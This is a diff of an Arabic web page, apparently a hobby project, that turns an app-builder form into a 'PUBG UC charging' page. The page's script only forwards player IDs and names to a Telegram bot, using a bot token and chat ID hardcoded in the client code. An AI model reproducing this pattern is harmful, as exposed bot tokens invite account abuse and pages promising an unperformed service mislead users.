@@ -1,107 +1,381 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>منشئ التطبيقات — Farmliya</title>
-  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Tajawal', sans-serif;
-      background: linear-gradient(135deg, #0d1b2a, #1b263b);
-      color: #fff;
-      text-align: center;
-      padding: 40px 20px;
-    }
-    .container {
-      background: rgba(255,255,255,0.1);
-      border-radius: 20px;
-      padding: 30px;
-      max-width: 500px;
-      margin: auto;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.5);
-    }
-    input, textarea, select {
-      width: 90%;
-      margin: 10px 0;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      outline: none;
-    }
-    button {
-      background: gold;
-      color: black;
-      font-size: 16px;
-      font-weight: bold;
-      padding: 12px 24px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: background 0.3s, transform 0.2s;
-    }
-    button:hover {
-      background: orange;
-      transform: scale(1.03);
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 15px;
-    }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Farmliya — شحن شدات ببجي (احترافي)</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;800&display=swap" rel="stylesheet">
+
+<style>
+  :root{
+    --bg-overlay: rgba(3,6,10,0.55);
+    --card: rgba(255,255,255,0.04);
+    --gold1: #f0c75e;
+    --gold2: #d9a441;
+    --muted: #9fb0b7;
+    --accent: linear-gradient(90deg,var(--gold1),var(--gold2));
+  }
+  html,body{height:100%;margin:0;font-family:'Tajawal',sans-serif;background:#041226;color:#eaf6f2;-webkit-font-smoothing:antialiased}
+  /* Background image */
+  .bg {
+    position:fixed; inset:0; z-index:-3; background-image: url('https://wallpapercave.com/wp/wp10223146.jpg');
+    background-size:cover; background-position:center; filter: blur(2px) brightness(.55);
+  }
+  .overlay { position:fixed; inset:0; background:linear-gradient(180deg, rgba(0,0,0,0.35), rgba(0,0,0,0.55)); z-index:-2; }
+
+  .page { max-width:1180px; margin:28px auto; padding:20px; display:grid; grid-template-columns: 1fr 360px; gap:18px; align-items:start; }
+
+  /* header */
+  header{ grid-column:1 / -1; display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:6px }
+  .brand { display:flex; align-items:center; gap:12px }
+  .logo {
+    width:72px;height:72px;border-radius:14px;
+    background:var(--accent);
+    display:flex; align-items:center; justify-content:center; color:#071018; font-weight:900; font-size:20px;
+    box-shadow: 0 12px 40px rgba(0,0,0,0.6), 0 0 12px rgba(240,199,94,0.12);
+    transform-origin:center;
+    animation:logo-pulse 3s infinite;
+  }
+  @keyframes logo-pulse { 0%{transform:rotate(-6deg) scale(1)} 50%{transform:rotate(6deg) scale(1.03)} 100%{transform:rotate(-6deg) scale(1)} }
+  .title h1{margin:0;font-size:18px}
+  .title p{margin:0;color:var(--muted);font-size:13px}
+
+  /* tabs */
+  nav.tabs { display:flex; gap:8px; align-items:center }
+  .tab { padding:8px 14px;border-radius:10px; cursor:pointer; background:transparent; color:var(--muted); border:1px solid rgba(255,255,255,0.03) }
+  .tab.active { background: linear-gradient(90deg, rgba(240,199,94,0.12), rgba(217,164,65,0.08)); color: #fff; box-shadow: 0 8px 30px rgba(217,164,65,0.06) }
+
+  /* main form card */
+  .card { background:var(--card); border-radius:14px; padding:18px; border:1px solid rgba(255,255,255,0.03); box-shadow: 0 10px 30px rgba(0,0,0,0.6) }
+  label{display:block;margin:8px 0 6px;color:var(--muted);font-size:13px}
+  input[type="text"], input[type="number"], select, textarea {
+    width:100%; padding:12px; border-radius:10px; border:1px solid rgba(255,255,255,0.04); background:rgba(255,255,255,0.02); color:inherit; outline:none; font-size:15px;
+  }
+  textarea{resize:vertical; min-height:80px;}
+
+  .row { display:flex; gap:10px }
+  .col { flex:1 }
+
+  .actions { display:flex; gap:10px; margin-top:12px; align-items:center; }
+  .btn {
+    padding:12px 16px;border-radius:12px;border:0;cursor:pointer;font-weight:800;
+    background:var(--accent); color:#071018; box-shadow: 0 10px 30px rgba(217,164,65,0.12);
+  }
+  .btn.secondary{ background:transparent;color:var(--muted); border:1px solid rgba(255,255,255,0.04); box-shadow:none; font-weight:700 }
+
+  .status { margin-top:10px; font-weight:700; color:var(--muted) }
+  .danger{ color:#ff8b8b } .success{ color:#b7f3c1 }
+
+  /* right column preview */
+  .right { position:sticky; top:28px }
+  .preview { background: linear-gradient(180deg, rgba(0,0,0,0.2), rgba(255,255,255,0.02)); padding:14px; border-radius:12px; border:1px solid rgba(255,255,255,0.03) }
+  .preview h3{margin:0 0 10px 0}
+  pre { white-space:pre-wrap; word-break:break-word; font-size:14px; color:#e8f9e9; background:transparent; margin:0 }
+
+  .progress { height:10px; background:rgba(255,255,255,0.03); border-radius:8px; overflow:hidden; margin-top:10px }
+  .progress > i { display:block; height:100%; width:0%; background: linear-gradient(90deg,var(--gold1),var(--gold2)); transition:width .25s ease }
+
+  /* footer */
+  footer{ grid-column:1 / -1; text-align:center; color:var(--muted); margin-top:18px; font-size:13px }
+
+  /* responsive */
+  @media (max-width:980px) {
+    .page { grid-template-columns: 1fr; padding:12px }
+    .right { position:relative; top:0 }
+    .logo{width:56px;height:56px}
+  }
+</style>
 </head>
 <body>
-  <div class="container">
-    <h1>🚀 منشئ تطبيقات</h1>
-    <p>اصنع تطبيقك مع Farmliya — أدخل البيانات أدناه</p>
+  <div class="bg"></div>
+  <div class="overlay"></div>
 
-    <form id="appForm">
-      <input type="text" name="appName" id="appName" placeholder="اسم التطبيق" required>
-      <textarea name="appDesc" id="appDesc" placeholder="وصف التطبيق (اختياري)" rows="3"></textarea>
-      <label>لون واجهة التطبيق:</label><br>
-      <input type="color" name="appColor" id="appColor" value="#00aaff"><br>
-      <label>أيقونة التطبيق (اختياري):</label><br>
-      <input type="file" name="appIcon" id="appIcon" accept="image/*"><br>
+  <div class="page">
+    <header>
+      <div class="brand">
+        <div class="logo" aria-hidden>UC</div>
+        <div class="title">
+          <h1>Farmliya — شحن شدات ببجي</h1>
+          <p>النسخة الاحترافية — واجهة آمنة وسلسة</p>
+        </div>
+      </div>
 
-      <button type="submit">إنشاء التطبيق 📱</button>
-    </form>
+      <nav class="tabs" role="tablist">
+        <div class="tab active" data-tab="home">الرئيسية</div>
+        <div class="tab" data-tab="history">السجل</div>
+        <div class="tab" data-tab="about">حول</div>
+      </nav>
+    </header>
 
-    <div id="status">لم يتم إرسال شيء بعد.</div>
+    <!-- left: main content -->
+    <main>
+      <section id="home" class="card section active">
+        <h2 style="margin:0 0 8px 0">⚡ اشحن شدات ببجي الآن</h2>
+        <p class="status muted">املأ بيانات اللاعب وسيتم إرسال الطلب إلى بوت التليغرام مباشرة.</p>
+
+        <form id="chargeForm" autocomplete="off">
+          <label>🎮 معرّف اللاعب (Player ID)</label>
+          <input id="playerId" inputmode="numeric" type="text" placeholder="مثال: 123456789" required>
+
+          <div class="row">
+            <div class="col">
+              <label>💰 عدد الشدات (UC)</label>
+              <select id="ucAmount" required>
+                <option value="">اختر الكمية</option>
+                <option value="60">60 UC</option>
+                <option value="300">300 UC</option>
+                <option value="600">600 UC</option>
+                <option value="1200">1200 UC</option>
+                <option value="2800">2800 UC</option>
+              </select>
+            </div>
+            <div class="col">
+              <label>🌍 السيرفر</label>
+              <select id="server" required>
+                <option value="">اختر السيرفر</option>
+                <option value="ASIA">ASIA</option>
+                <option value="EUROPE">EUROPE</option>
+                <option value="NA">NORTH AMERICA</option>
+                <option value="MENA">MENA</option>
+              </select>
+            </div>
+          </div>
+
+          <label>👤 اسم اللاعب (اختياري)</label>
+          <input id="playerName" type="text" placeholder="اسم اللاعب">
+
+          <div style="margin-top:12px">
+            <label style="font-size:13px"><input id="consent" type="checkbox"> أوافق على استخدام هذه البيانات للاختبار والتواصل فقط.</label>
+          </div>
+
+          <div class="actions">
+            <button id="sendBtn" class="btn" type="submit">اشحن الآن ⚡</button>
+            <button id="clearBtn" type="button" class="btn secondary">مسح</button>
+            <button id="playDemo" type="button" class="btn secondary">✦ معاينة صوت</button>
+          </div>
+
+          <div id="formStatus" class="status muted">جاهز للإرسال.</div>
+          <div class="progress" id="progressWrap" style="display:none"><i id="progressBar"></i></div>
+        </form>
+      </section>
+
+      <section id="history" class="card section" style="display:none;margin-top:12px">
+        <h3>سجل الطلبات المحلية</h3>
+        <div id="localLog" style="min-height:120px; max-height:360px; overflow:auto; padding:10px; background:rgba(0,0,0,0.25); border-radius:10px; color:#dff1df">لا توجد سجلات حتى الآن.</div>
+      </section>
+
+      <section id="about" class="card section" style="display:none;margin-top:12px">
+        <h3>معلومات عن Farmliya</h3>
+        <p class="muted">واجهة متقدمة لشحن شدات ببجي — مصممة لتجربة أنيقة وسريعة. الرسائل تُرسل مباشرةً لبوت التليغرام الخاص بك.</p>
+        <p class="muted">تحذير: لا تضع BOT_TOKEN في مستودع عام. احفظه في ملف بيئة على السيرفر إن أمكن.</p>
+      </section>
+    </main>
+
+    <!-- right column -->
+    <aside class="right">
+      <div class="card preview">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <h3 style="margin:0">معاينة الرسالة</h3>
+          <div class="muted" style="font-size:13px">تحديث مباشر</div>
+        </div>
+        <pre id="preview">لا توجد بيانات بعد.</pre>
+
+        <div style="margin-top:12px; display:flex; gap:8px; align-items:center">
+          <button id="copyBtn" class="btn secondary">نسخ</button>
+          <button id="downloadBtn" class="btn secondary">حفظ سجل</button>
+        </div>
+
+        <div style="margin-top:14px">
+          <div class="muted">ملاحظات</div>
+          <div class="muted" style="font-size:13px; margin-top:6px">ستتم إعادة محاولة الإرسال تلقائياً عند الفشل، وتخزين نسخة احتياطية محلياً.</div>
+        </div>
+      </div>
+    </aside>
+
+    <footer>Ⓒ Farmliya — جميع الحقوق محفوظة</footer>
   </div>
 
-  <script>
-    document.getElementById('appForm').addEventListener('submit', async function(e){
-      e.preventDefault();
-      const statusEl = document.getElementById('status');
-      statusEl.textContent = '⏳ جاري الإرسال…';
+<script>
+/* ================== CONFIG ==================
+   ضع توكن البوت و chat id هنا للاختبار المحلي فقط.
+   لا تترك القيم في مستودع عام!
+*/
+const BOT_TOKEN = "7917070284:AAG6dAMr4QeVDeoAtpltPsEbqpG3WXiOKpI"; // << استبدل هنا إن أردت
+const CHAT_ID = "5653032481";
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+/* ============================================ */
 
-      const form = e.target;
-      const url = "https://ba24d4c9-335f-4858-98f6-812b88ed4512-00-1vkj8afebu86l.janeway.replit.dev/build";
+const tabs = document.querySelectorAll('.tab');
+const sections = document.querySelectorAll('.section');
+tabs.forEach(t => t.addEventListener('click', () => {
+  tabs.forEach(x => x.classList.remove('active'));
+  t.classList.add('active');
+  const id = t.dataset.tab;
+  sections.forEach(s => s.style.display = s.id === id ? 'block' : 'none');
+}));
 
-      const data = new FormData(form);
+// UI elements
+const form = document.getElementById('chargeForm');
+const playerIdEl = document.getElementById('playerId');
+const playerNameEl = document.getElementById('playerName');
+const ucEl = document.getElementById('ucAmount');
+const serverEl = document.getElementById('server');
+const consentEl = document.getElementById('consent');
+const sendBtn = document.getElementById('sendBtn');
+const clearBtn = document.getElementById('clearBtn');
+const preview = document.getElementById('preview');
+const statusEl = document.getElementById('formStatus');
+const progressWrap = document.getElementById('progressWrap');
+const progressBar = document.getElementById('progressBar');
+const localLogEl = document.getElementById('localLog');
+const copyBtn = document.getElementById('copyBtn');
+const downloadBtn = document.getElementById('downloadBtn');
+const playDemo = document.getElementById('playDemo');
 
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          body: data
-        });
-        if (!response.ok) {
-          throw new Error('Network response was not OK');
-        }
-        const result = await response.json();
-        if (result.download) {
-          statusEl.innerHTML = `✅ تم الإنشاء! <a href="${result.download}" style="color: gold;">تحميل التطبيق</a>`;
-        } else {
-          statusEl.textContent = '⚠️ تم الاستلام، لكن لم يتم إعطاؤك رابط تحميل.';
-        }
-      } catch (err) {
-        console.error(err);
-        statusEl.textContent = '❌ حدث خطأ أثناء الاتصال بالخادم.';
+let logs = [];
+
+// small synthesized click sound using WebAudio
+const AudioCtx = window.AudioContext || window.webkitAudioContext;
+let audioCtx;
+function playClick(){
+  try{
+    if(!audioCtx) audioCtx = new AudioCtx();
+    const o = audioCtx.createOscillator();
+    const g = audioCtx.createGain();
+    o.type = 'sine';
+    o.frequency.setValueAtTime(750, audioCtx.currentTime);
+    g.gain.setValueAtTime(0.0001, audioCtx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.12, audioCtx.currentTime + 0.01);
+    g.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.35);
+    o.connect(g); g.connect(audioCtx.destination);
+    o.start(); o.stop(audioCtx.currentTime + 0.36);
+  }catch(e){ /* ignore */ }
+}
+playDemo.addEventListener('click', ()=> playClick());
+
+// preview builder
+function sanitize(s){ return String(s||'').replace(/[<>]/g,''); }
+function buildText(data){
+  return `🎯 طلب شحن جديد (Farmliya)\n🆔 ID: ${sanitize(data.playerId)}\n💰 UC: ${sanitize(data.uc)}\n🌍 Server: ${sanitize(data.server)}\n👤 Name: ${sanitize(data.playerName||'(غير مُدخل)')}\n🕒 Time: ${new Date().toLocaleString()}\n🔗 Source: ${location.href}`;
+}
+function showPreview(){
+  const data = {
+    playerId: playerIdEl.value.trim(),
+    playerName: playerNameEl.value.trim(),
+    uc: ucEl.value,
+    server: serverEl.value
+  };
+  preview.textContent = buildText(data);
+}
+
+// live preview
+[playerIdEl, playerNameEl, ucEl, serverEl].forEach(el => el.addEventListener('input', showPreview));
+
+copyBtn.addEventListener('click', async ()=>{
+  try{
+    await navigator.clipboard.writeText(preview.textContent || '');
+    alert('تم النسخ!');
+  }catch(e){ alert('فشل النسخ'); }
+});
+
+downloadBtn.addEventListener('click', ()=>{
+  const blob = new Blob([localLogEl.textContent], { type:'text/plain;charset=utf-8' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = 'farmliya_logs.txt'; document.body.appendChild(a); a.click(); a.remove();
+});
+
+// local logs load/save
+function appendLog(obj){
+  logs.unshift(obj);
+  if(logs.length>200) logs.pop();
+  localLogEl.textContent = logs.map(l => `[${l.time}] ${l.status} - ${l.summary}`).join("\n\n");
+  try{ localStorage.setItem('farmliya_logs', JSON.stringify(logs.slice(0,100))); }catch(e){}
+}
+(function loadLogs(){
+  try{
+    const saved = JSON.parse(localStorage.getItem('farmliya_logs')||'[]');
+    if(saved.length){ logs = saved; appendLog({time:new Date().toLocaleString(),status:'INFO',summary:`تم تحميل ${saved.length} سجل محليًا`}); }
+    else localLogEl.textContent = 'فارغ';
+  }catch(e){ localLogEl.textContent = 'خطأ في تحميل السجل المحلي'; }
+})();
+
+// progress
+function setProgress(p){ progressBar.style.width = p + '%'; }
+
+// send handler with retries
+form.addEventListener('submit', async (e)=>{
+  e.preventDefault();
+  playClick();
+
+  // validation
+  const pid = playerIdEl.value.trim();
+  const uc = ucEl.value;
+  const server = serverEl.value;
+  const pname = playerNameEl.value.trim();
+  const consent = consentEl.checked;
+
+  if(!pid || !/^\d+$/.test(pid)){ statusEl.innerHTML = '<span class="danger">أدخل Player ID صالح (أرقام فقط).</span>'; return; }
+  if(!uc){ statusEl.innerHTML = '<span class="danger">اختر كمية الشدات.</span>'; return; }
+  if(!server){ statusEl.innerHTML = '<span class="danger">اختر السيرفر.</span>'; return; }
+  if(!consent){ statusEl.innerHTML = '<span class="danger">يجب الموافقة على استخدام البيانات.</span>'; return; }
+
+  const payloadText = buildText({playerId:pid, playerName:pname, uc, server});
+
+  // UI prepare
+  sendBtn.disabled = true; sendBtn.textContent = 'جارٍ الإرسال...';
+  statusEl.textContent = 'جاري إرسال الطلب إلى التليغرام...'; statusEl.classList.remove('danger','success');
+  progressWrap.style.display = 'block'; setProgress(10);
+
+  const maxRetries = 3;
+  let attempt = 0, ok = false, lastErr = null;
+
+  while(attempt < maxRetries && !ok){
+    attempt++;
+    try{
+      setProgress(10 + attempt*20);
+      const resp = await fetch(TELEGRAM_API, {
+        method:'POST',
+        headers:{ 'Content-Type':'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: payloadText })
+      });
+      const j = await resp.json().catch(()=>({ok:resp.ok}));
+      if(resp.ok && (j.ok || j.result)){
+        ok = true;
+        setProgress(100);
+        statusEl.innerHTML = '<span class="success">✅ تم الإرسال بنجاح! ستتلقى إشعارًا في بوت التليغرام.</span>';
+        appendLog({ time:new Date().toLocaleString(), status:'SUCCESS', summary:`ID=${pid} UC=${uc} server=${server}` });
+        form.reset(); showPreview();
+        break;
+      } else {
+        lastErr = j;
+        throw new Error(JSON.stringify(j));
       }
-    });
-  </script>
+    }catch(err){
+      lastErr = err;
+      statusEl.innerHTML = `<span class="danger">خطأ بالإرسال (محاولة ${attempt}): ${sanitize(String(err).slice(0,120))}</span>`;
+      appendLog({ time:new Date().toLocaleString(), status:'RETRY', summary:`Attempt ${attempt} failed`});
+      await new Promise(r => setTimeout(r, 700 * attempt));
+    }
+  }
+
+  if(!ok){
+    statusEl.innerHTML += `<div class="muted">فشل نهائي. يمكنك نسخ الرسالة يدويًا أو حفظ السجل.</div>`;
+    appendLog({ time:new Date().toLocaleString(), status:'FAILED', summary:`ID=${pid} UC=${uc} server=${server}: ${String(lastErr).slice(0,80)}`});
+    try{ await navigator.clipboard.writeText(payloadText); }catch(e){}
+  }
+
+  // reset UI
+  sendBtn.disabled = false; sendBtn.textContent = 'اشحن الآن ⚡';
+  setTimeout(()=>{ progressWrap.style.display='none'; setProgress(0); }, 900);
+});
+
+// clear
+clearBtn.addEventListener('click', ()=>{ form.reset(); showPreview(); statusEl.textContent = 'تم المسح.'; });
+
+// initial preview
+showPreview();
+</script>
+
 </body>
 </html>
